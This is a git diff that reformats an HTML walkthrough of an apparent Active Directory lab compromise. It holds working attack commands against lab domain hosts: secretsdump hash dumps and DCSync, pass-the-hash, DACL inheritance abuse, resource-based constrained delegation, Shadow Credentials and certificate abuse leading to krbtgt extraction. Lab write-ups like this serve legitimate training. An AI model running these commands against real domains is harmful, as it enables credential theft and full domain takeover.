@@ -1195,7 +1195,7 @@ net localgroup Administrators stark /add</p>
 
 <img src="./images/screenshot_30.png" alt="">
 
-<p>evil-winrm -i 'sql.academy.ninja.lan' -u 'stark' -p 'Stark123!'</p>
+<pre><code>evil-winrm -i 'sql.academy.ninja.lan' -u 'stark' -p 'Stark123!'</code></pre>
 
 <img src="./images/screenshot_31.png" alt="">
 
@@ -1214,7 +1214,7 @@ reg save HKLM\SECURITY C:\SECURITY</p>
 
 <p>Now we can decrypt the file combining them all with secretsdump.py from Impacket.</p>
 
-<p>secretsdump.py -system SYSTEM -security SECURITY -sam SAM local</p>
+<pre><code>secretsdump.py -system SYSTEM -security SECURITY -sam SAM local</code></pre>
 
 <pre><code>Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 
 
@@ -1245,7 +1245,7 @@ NL$KM:6408d7d8e2afea8d0f5e5b101f231178edceae62d321b940a8906c0448d843400bc938ba1c
 
 <p>We can see above that we were able to dump several hashes. but for some reason I noticed that we were missing lots of information, so I decided to used the just dumped Administrator NTLM hash and use secretsdump.py again, but this type I’ll request it straight to the server.</p>
 
-<p>secretsdump.py -hashes 'aad3b435b51404eeaad3b435b51404ee:a12f1ae521c09a176ae74feb7806138d' 'administrator@sql.academy.ninja.lan'</p>
+<pre><code>secretsdump.py -hashes 'aad3b435b51404eeaad3b435b51404ee:a12f1ae521c09a176ae74feb7806138d' 'administrator@sql.academy.ninja.lan'</code></pre>
 
 <pre><code>Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 
 
@@ -1364,7 +1364,7 @@ ADDCURRENTUSERASSQLADMIN="True"</code></pre>
 <p>Since we do have a valid domain account, I decided to use Bloodhound to enumerate the whole academy.ninja.lan domain.
 BloodHound-python is a tool used to collect and analyze data from Active Directory environments. It gathers information about AD objects (users, groups, permissions, etc.) and relationships, which can then be visualized in BloodHound to identify attack paths for privilege escalation.</p>
 
-<p>bloodhound-python -c all  -d 'academy.ninja.lan' -u 'SQL$' -aesKey '52910fc862652b7a15e0faf0bad2de655196ad608b301e7c9435e6929634746f' -dc 'dc-ac.academy.ninja.lan' -gc 'dc-ac.academy.ninja.lan'</p>
+<pre><code>bloodhound-python -c all  -d 'academy.ninja.lan' -u 'SQL$' -aesKey '52910fc862652b7a15e0faf0bad2de655196ad608b301e7c9435e6929634746f' -dc 'dc-ac.academy.ninja.lan' -gc 'dc-ac.academy.ninja.lan'</code></pre>
 
 <img src="./images/screenshot_35.png" alt="">
 
@@ -1514,20 +1514,20 @@ Each step exploits the identified privileges to escalate access, ultimately lead
 
 <p>With full control of the container, we may add a new ACE on the container that will inherit down to the objects under that OU. </p>
 
-<p>Meaning… If the WEB$ account is part of a container where we hold GenericAll privileges, we might assume that we already have enough access to manage it. However, that’s not the case. 
+<pre><code>Meaning… If the WEB$ account is part of a container where we hold GenericAll privileges, we might assume that we already have enough access to manage it. However, that’s not the case. 
 The key issue is that we don’t directly have those privileges over the WEB$ object itself. To gain the necessary access, we would first need to enable inheritance. 
-This would ensure that any privileges granted on the container also apply to the objects within it, including WEB$.</p>
+This would ensure that any privileges granted on the container also apply to the objects within it, including WEB$.</code></pre>
 
 <p>Checking the DACL rights SQL$ has to the computers@academy.ninja.lan container.</p>
 
-<p>dacledit.py -action 'read' -principal 'SQL$' -target-dn 'CN=COMPUTERS,DC=ACADEMY,DC=NINJA,DC=LAN' 'academy.ninja.lan'/'SQL$' -aesKey '52910fc862652b7a15e0faf0bad2de655196ad608b301e7c9435e6929634746f'</p>
+<pre><code>dacledit.py -action 'read' -principal 'SQL$' -target-dn 'CN=COMPUTERS,DC=ACADEMY,DC=NINJA,DC=LAN' 'academy.ninja.lan'/'SQL$' -aesKey '52910fc862652b7a15e0faf0bad2de655196ad608b301e7c9435e6929634746f'</code></pre>
 
 <img src="./images/screenshot_37.png" alt="">
 
-<p>We can see above screenshot that SQL$ machine account has FullControl ready, which of course it has to be because we have GenericAll already.
-Now, the next step is to enable inheritance using our SQL$ machine hashes to the Distinguished Name (dn) of COMPUTERS container. Once that is done, we can see that we will have GenericAll privileges over the WEB$ machine. </p>
+<pre><code>We can see above screenshot that SQL$ machine account has FullControl ready, which of course it has to be because we have GenericAll already.
+Now, the next step is to enable inheritance using our SQL$ machine hashes to the Distinguished Name (dn) of COMPUTERS container. Once that is done, we can see that we will have GenericAll privileges over the WEB$ machine. </code></pre>
 
-<p>dacledit.py -action 'write' -principal 'SQL$' -target-dn 'CN=COMPUTERS,DC=ACADEMY,DC=NINJA,DC=LAN' 'academy.ninja.lan'/'SQL$' -aesKey '52910fc862652b7a15e0faf0bad2de655196ad608b301e7c9435e6929634746f' -inheritance</p>
+<pre><code>dacledit.py -action 'write' -principal 'SQL$' -target-dn 'CN=COMPUTERS,DC=ACADEMY,DC=NINJA,DC=LAN' 'academy.ninja.lan'/'SQL$' -aesKey '52910fc862652b7a15e0faf0bad2de655196ad608b301e7c9435e6929634746f' -inheritance</code></pre>
 
 <img src="./images/screenshot_38.png" alt="">
 
@@ -1541,15 +1541,15 @@ dacledit.py -action 'read' -principal 'SQL$' -target-dn 'CN=WEB,CN=COMPUTERS,DC=
 
 <img src="./images/screenshot_40.png" alt="">
 
-<p>Now we have the right permissions to touch whatever over the object that is a part of the container. In this case we can now abuse web.academy.ninja.lan host.
-We now have directly GenericAll over WEB$ machine</p>
+<pre><code>Now we have the right permissions to touch whatever over the object that is a part of the container. In this case we can now abuse web.academy.ninja.lan host.
+We now have directly GenericAll over WEB$ machine</code></pre>
 
 <h2 id="web-server-privilege-escalation---resource-based-constrained-delegation">WEB Server Privilege Escalation - Resource Based Constrained Delegation</h2>
 
 <p>A Resource-Based Constrained Delegation (RBCD) attack allows an attacker to take control of a resource (like a machine) in an Active Directory environment and configure it to impersonate other users, leading to privilege escalation or lateral movement. This attack exploits the ability of a resource to delegate authentication without the owner's permission.</p>
 
-<p>Well, now we do have GenericAll permission over a WEB$ computer account, in this case we have GenericAll over web.academy.ninja.lan.
-Because of the permission we have on the machine, we can abuse the RBCD (Resource Based Constrained Delegation).</p>
+<pre><code>Well, now we do have GenericAll permission over a WEB$ computer account, in this case we have GenericAll over web.academy.ninja.lan.
+Because of the permission we have on the machine, we can abuse the RBCD (Resource Based Constrained Delegation).</code></pre>
 
 <p>1st - We do ADD a computer to the domain.
 addcomputer.py -computer-name 'starkcomputer$' -computer-pass 'Stark123!' -dc-host 'dc-ac.academy.ninja.lan' 'academy.ninja.lan'/'SQL$'@'academy.ninja.lan' -aesKey '52910fc862652b7a15e0faf0bad2de655196ad608b301e7c9435e6929634746f'</p>
@@ -1602,7 +1602,7 @@ net localgroup Administrators stark /add</p>
 
 <img src="./images/screenshot_46.png" alt="">
 
-<p>evil-winrm -i 'web.academy.ninja.lan' -u 'stark' -p 'Stark123!'</p>
+<pre><code>evil-winrm -i 'web.academy.ninja.lan' -u 'stark' -p 'Stark123!'</code></pre>
 
 <img src="./images/screenshot_47.png" alt="">
 
@@ -1912,7 +1912,7 @@ frank           Person       Constrained w/ Protocol Transition  eventlog/share.
 
 <p>The output you're seeing indicates that you've successfully requested a TGT (Ticket Granting Ticket) for the Administrator user and have also requested S4U2self and S4U2Proxy tickets. The ticket has been saved in the ccache file for further use. Now, to access the eventlog/share.academy.ninja.lan service.</p>
 
-<p>export KRB5CCNAME=Administrator@cifs_share@ACADEMY.NINJA.LAN.ccache</p>
+<pre><code>export KRB5CCNAME=Administrator@cifs_share@ACADEMY.NINJA.LAN.ccache</code></pre>
 
 <p>wmiexec.py @share -k -no-pass</p>
 
@@ -2126,8 +2126,8 @@ netexec smb share.academy.ninja.lan -u 'gmsaNFS$' -H 'f5e1d46b0a91aeae00514bd429
 
 <h2 id="forcechangepassword">ForceChangePassword</h2>
 
-<p>This abuse can be carried out when controlling an object that has a GenericAll, AllExtendedRights or User-Force-Change-Password over the target user.
-Back to our enumeration with Bloodhound and Bloodhound-QuickWins, the GMSANFS$ account that ForceChangePassword to  backup@academy.ninja.lan user account.</p>
+<pre><code>This abuse can be carried out when controlling an object that has a GenericAll, AllExtendedRights or User-Force-Change-Password over the target user.
+Back to our enumeration with Bloodhound and Bloodhound-QuickWins, the GMSANFS$ account that ForceChangePassword to  backup@academy.ninja.lan user account.</code></pre>
 
 <img src="./images/screenshot_58.png" alt="">
 
@@ -2227,7 +2227,7 @@ sudo ldeep ldap -u 'backup' -p 'Stark123!Backup' -d 'academy.ninja.lan' -s 'ldap
 
 <p>Now that we were able to add ourselves into Domain Admins Group, we can can simply do a DCSync attack using secretsdump using our Backup Creds.</p>
 
-<p>secretsdump.py 'backup:Stark123!Backup@dc-ac.academy.ninja.lan'</p>
+<pre><code>secretsdump.py 'backup:Stark123!Backup@dc-ac.academy.ninja.lan'</code></pre>
 
 <pre><code>Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 
 
@@ -2429,7 +2429,7 @@ When we did the DCSync attack, we were able to dump the NTDS.dit file and we get
 So I decided to use the same olivia.davis and frank.umino’s NTLM hashes dumped from the DCSync attack too see if we are able to login to dc-vil.ninja.hack the ninja.hack Domain Controller. 
 netexec smb dc-vil.ninja.hack -u 'frank.umino' -H 'd4fad93561dee253398d5891e991a6fb'</p>
 
-<p>netexec smb dc-vil.ninja.hack -u 'olivia.davis' -H '91d85135bb2c4e12c46efbb77612c487'</p>
+<pre><code>netexec smb dc-vil.ninja.hack -u 'olivia.davis' -H '91d85135bb2c4e12c46efbb77612c487'</code></pre>
 
 <img src="./images/screenshot_71.png" alt="">
 
@@ -2515,7 +2515,7 @@ dacledit.py -action 'read' -principal 'olivia.davis' -target 'rachel.philips' 'n
 
 <p>We can see above the WriteDACL right from user Olivia.Davis to Rachel.Philips on “Access mask” flag. Now let’s change it to “FullControll”</p>
 
-<p>dacledit.py -action 'write' -rights 'FullControl' -principal 'olivia.davis' -target 'rachel.philips' 'ninja.hack/olivia.davis'  -dc-ip 'dc-vil.ninja.hack' -hashes ':91d85135bb2c4e12c46efbb77612c487'</p>
+<pre><code>dacledit.py -action 'write' -rights 'FullControl' -principal 'olivia.davis' -target 'rachel.philips' 'ninja.hack/olivia.davis'  -dc-ip 'dc-vil.ninja.hack' -hashes ':91d85135bb2c4e12c46efbb77612c487'</code></pre>
 
 <img src="./images/screenshot_75.png" alt="">
 
@@ -2537,7 +2537,7 @@ dacledit.py -action 'read' -principal 'olivia.davis' -target 'rachel.philips' 'n
 <p>We want to avoid changing user’s credentials, because this can raise alerts, user can get locked out, so let’s go for the Shadow Credentials option where we can get Rachel.Philips TGT and NT hash.
 Let’s use Certipy to accomplish this Shadow Credential attack</p>
 
-<p>certipy-ad shadow auto -u 'olivia.davis@ninja.hack' -hashes ':91d85135bb2c4e12c46efbb77612c487' -account 'rachel.philips’</p>
+<pre><code>certipy-ad shadow auto -u 'olivia.davis@ninja.hack' -hashes ':91d85135bb2c4e12c46efbb77612c487' -account 'rachel.philips’</code></pre>
 
 <img src="./images/screenshot_77.png" alt="">
 
@@ -2545,7 +2545,7 @@ Let’s use Certipy to accomplish this Shadow Credential attack</p>
 
 <p>Now as usual let’s check it Rachel.Philips NTLM hashes will work.</p>
 
-<p>netexec smb dc-vil.ninja.hack -u 'rachel.philips' -H '9755a3421982f684f66d411f661da264'</p>
+<pre><code>netexec smb dc-vil.ninja.hack -u 'rachel.philips' -H '9755a3421982f684f66d411f661da264'</code></pre>
 
 <img src="./images/screenshot_78.png" alt="">
 
@@ -2626,7 +2626,7 @@ certipy-ad cert -pfx 'administrator.pfx' -nokey -out 'administrator.crt'</p>
 
 <img src="./images/screenshot_89.png" alt="">
 
-<p>certipy-ad cert -pfx 'administrator.pfx' -nocert -out 'administrator.key'</p>
+<pre><code>certipy-ad cert -pfx 'administrator.pfx' -nocert -out 'administrator.key'</code></pre>
 
 <img src="./images/screenshot_90.png" alt="">
 
@@ -2649,7 +2649,7 @@ passthecert.py -action 'modify_user' -crt 'administrator.crt' -key 'administrato
 
 <p>The administrator account only gives access to the specific machine or domain it's part of, without granting the broader ticket manipulation powers.</p>
 
-<p>secretsdump.py -just-dc-user 'krbtgt' 'ninja.hack/rachel.philips@dc-vil.ninja.hack' -hashes ':9755a3421982f684f66d411f661da264'</p>
+<pre><code>secretsdump.py -just-dc-user 'krbtgt' 'ninja.hack/rachel.philips@dc-vil.ninja.hack' -hashes ':9755a3421982f684f66d411f661da264'</code></pre>
 
 <img src="./images/screenshot_92.png" alt="">
 
@@ -2659,7 +2659,7 @@ passthecert.py -action 'modify_user' -crt 'administrator.crt' -key 'administrato
 
 <p>Since we already detain the administrator.pfx certificate previously abusing ESC4 to ESC1 attack, we can simply go forward and use the administrator certificate to request it’s TGT and also get the administrator NTLM hash.</p>
 
-<p>certipy-ad auth -pfx administrator.pfx  -dc-ip '192.168.58.10'</p>
+<pre><code>certipy-ad auth -pfx administrator.pfx  -dc-ip '192.168.58.10'</code></pre>
 
 <img src="./images/screenshot_94.png" alt="">
 
@@ -2667,7 +2667,7 @@ passthecert.py -action 'modify_user' -crt 'administrator.crt' -key 'administrato
 
 <p>Once again we were able to authenticate the domain controller using the domain administrator’s certificate and request its TGT. If you see above, besides the TGT we also got the administrator’s NTLM hash.</p>
 
-<p>secretsdump.py -just-dc-user 'krbtgt' 'ninja.hack/administrator@dc-vil.ninja.hack' -hashes ':26777fdb79382484117ccfda940eca82'</p>
+<pre><code>secretsdump.py -just-dc-user 'krbtgt' 'ninja.hack/administrator@dc-vil.ninja.hack' -hashes ':26777fdb79382484117ccfda940eca82'</code></pre>
 
 <img src="./images/screenshot_95.png" alt="">
 
